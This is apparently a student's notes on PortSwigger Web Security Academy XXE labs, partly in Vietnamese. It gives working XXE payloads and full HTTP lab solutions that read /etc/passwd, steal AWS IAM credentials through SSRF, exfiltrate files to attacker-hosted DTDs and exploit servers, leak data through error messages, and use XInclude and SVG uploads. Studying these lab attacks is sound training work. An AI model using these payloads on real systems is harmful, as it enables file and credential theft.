# What is XML external entity injection?
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. 


Read a brief intro on XML and XML entities here:
https://portswigger.net/web-security/xxe/xml-entities

(Entity trong XML như một biến dùng chung trong cả tài liệu XML khi nó được khai báo trong DTD)

Entity (general entity) là một tên được đặt cho một đoạn nội dung, và khi trình phân tích cú pháp gặp tham chiếu `&tên;`, nó sẽ thay thế tham chiếu đó bằng nội dung đã định nghĩa.
# Exploiting XXE to retrieve files
To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity `&xxe;` whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
### Lab: Exploiting XXE using external entities to retrieve files
The checkstock payload has a XXE vuln in the product in the productId value
```
POST /product/stock HTTP/2
Host: 0a4f006e03ce65e580d2b71f00db0028.web-security-academy.net
Cookie: session=hXIzSLtEBu6GDUeCt8zHLkJRrkE6daRL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4f006e03ce65e580d2b71f00db0028.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 182
Origin: https://0a4f006e03ce65e580d2b71f00db0028.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>
&xxe;
</productId><storeId>hehe</storeId></stockCheck>
```
### Lab: Exploiting XXE to perform SSRF attacks
The application accepts XML via POST `/product/stock` with `Content-Type: application/xml`. The productId value is embedded into the XML and entities are resolved — a textbook XXE condition.

The AWS metadata service listens on http://169.254.169.254. Relevant paths:

- `/latest/meta-data/` — lists available metadata

- `/latest/meta-data/iam/security-credentials/` — lists IAM roles

- `/latest/meta-data/iam/security-credentials/<role>` — returns AccessKeyId, SecretAccessKey, Token

First, you send a payload whose entity points to the root of the metadata service:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
The response returns `latest` — confirming the server made an outbound request and reflected the body back.

```
POST /product/stock HTTP/2
Host: 0a2f008c034373b38661e93400120066.web-security-academy.net
Cookie: session=ff8i5u0sazFnUgVzgcsdNiMwOQQevdS3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2f008c034373b38661e93400120066.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 230
Origin: https://0a2f008c034373b38661e93400120066.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>hehe</storeId></stockCheck>
```

# Blind XXE
Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

- You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
- You can trigger XML parsing errors in such a way that the error messages contain sensitive data.
## Detecting blind XXE using out-of-band (OAST) techniques

### Lab: Blind XXE with out-of-band interaction
Perform a get request to a Burp Collab domain, ez
```
POST /product/stock HTTP/2
Host: 0aca002603fa76ae847c824d00c70043.web-security-academy.net
Cookie: session=tDJsJZXb2ginOKAHpcwNXdvf2ZA3ii7N
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aca002603fa76ae847c824d00c70043.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 208
Origin: https://0aca002603fa76ae847c824d00c70043.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://2svdqpk3juttdoag8nxk885tlkrbf13q.oastify.com"> ] >
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Lab: Blind XXE with out-of-band interaction via XML parameter entities


__POC__

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
 ```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```
And second, parameter entities are referenced using the percent character instead of the usual ampersand:
```xml
%myparameterentity;
```
This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful. 

__Solution__
```
POST /product/stock HTTP/2
Host: 0a7f00b3039e83e6807f35b7005100fb.web-security-academy.net
Cookie: session=iFJjRlclXQKKdSx6TpA3Dqx3U7728GEp
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7f00b3039e83e6807f35b7005100fb.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 219
Origin: https://0a7f00b3039e83e6807f35b7005100fb.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://i0jty5sjra19l4iwg350god9t0zrnib7.oastify.com"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

```
## Exploiting blind XXE to exfiltrate data out-of-band
### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
__POC__

 Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
This DTD carries out the following steps:

1. Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
2. Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
3. Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
4. s the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:`
http://web-attacker.com/malicious.dtd`

Finally, the attacker must submit the following XXE payload to the vulnerable application:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server. 

__Solution__

External `.dtd` file payload on exploit server 
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0ae6002e036419d1808f7a3e01d10009.exploit-server.net?data=%file;'>">
%eval;
%exfiltrate;
```

Exploit payload: 
```
POST /product/stock HTTP/2
Host: 0ab1004e03e8198e80407ba2002f007c.web-security-academy.net
Cookie: session=eBqZcKlYwRbCwVOv3w8hyHooyTdQzEj1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab1004e03e8198e80407ba2002f007c.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 237
Origin: https://0ab1004e03e8198e80407ba2002f007c.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ae6002e036419d1808f7a3e01d10009.exploit-server.net/exploit"> %xxe;]>
<stockCheck><productId>
1</productId><storeId>1</storeId></stockCheck>
```

## Exploiting blind XXE to retrieve data via error messages
### Lab: Exploiting blind XXE to retrieve data via error messages
__POC__

 An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the /etc/passwd file using a malicious external DTD as follows:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
This DTD carries out the following steps:

1. Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
2. Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
3. Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.
4. Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file.

Invoking the malicious external DTD will result in an error message like the following:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

__Solution__

External `.dtd` payload
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Exploit payload
```
POST /product/stock HTTP/2
Host: 0a09000303c090838273155600fd0029.web-security-academy.net
Cookie: session=x7nq8LV9EG5P3nJSgIT0Q5CbwgzkvlVA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09000303c090838273155600fd0029.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 235
Origin: https://0a09000303c090838273155600fd0029.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM 'https://exploit-0a820029038c90d0829014bc01580096.exploit-server.net/exploit'> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Exploiting blind XXE by repurposing a local DTD (Expert)
# Finding hidden attack surface for XXE injection

In this lab you already know the lab contains a XML input vuln, but in reality, you have to know if the web' using XML to handle input. `Content-Type: application/xml` header in a request is an indication. Additionally, sending special XML char (`<`, `>`, `&lt;`, `rt;`) is also a good approach.

Modify the checkStock productId input:
```
POST /product/stock HTTP/2
Host: 0a0b005404cb50fe8003a402009700e8.web-security-academy.net
Cookie: session=ujPYXalNkm8w7Q314FR3pJp2WiYMHLyP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0b005404cb50fe8003a402009700e8.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a0b005404cb50fe8003a402009700e8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=<&storeId=1
```

You will see that the server responses with an XML syntax error:
```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 173

"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 17; The content of elements must consist of well-formed character data or markup."
```

### Lab: Exploiting XInclude to retrieve files
__POC__

XInclude được thiết kế để hợp nhất (merge) nhiều tài liệu XML lại với nhau, và server đọc href là vì đây chính là cơ chế cốt lõi của XInclude: nó cần lấy nội dung từ một tài nguyên bên ngoài và chèn vào vị trí hiện tại.

__Payload (Inject to productId)__ 
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
__Explanation:__
```
xmlns:xi="http://www.w3.org/2001/XInclude"
```
Declares the namespace prefix xi bound to the XInclude vocabulary. This is the trigger: without it, the parser treats xi:include as an ordinary unknown element and does nothing. The URI is just an identifier — the parser does not fetch it.
```
<foo>...</foo>
```
An arbitrary wrapper element. The name is irrelevant — any valid XML element works. It exists only to give the document a root element so the XML is well-formed.
```
<xi:include .../>
```
An XInclude directive. When the parser encounters an element in the XInclude namespace, it performs an inclusion: it resolves the href and inserts the target's content in place of the element.
```
parse="text"
```
Tells XInclude to include the target (content of the href resource) as plain text, not to parse it as XML. This is essential here: /etc/passwd is not well-formed XML, so without parse="text" the inclusion would fail with a parse error. With it, the raw file contents are inserted verbatim.
```
href="file:///etc/passwd"
```
The resource to include — a local file via the `file://` scheme. The parser reads the file and substitutes its contents into the document.


### Lab: XXE attacks via file upload
__POC__

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities. 


__Payload__

You can make some style changes for the stolen hostname to be bigger
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```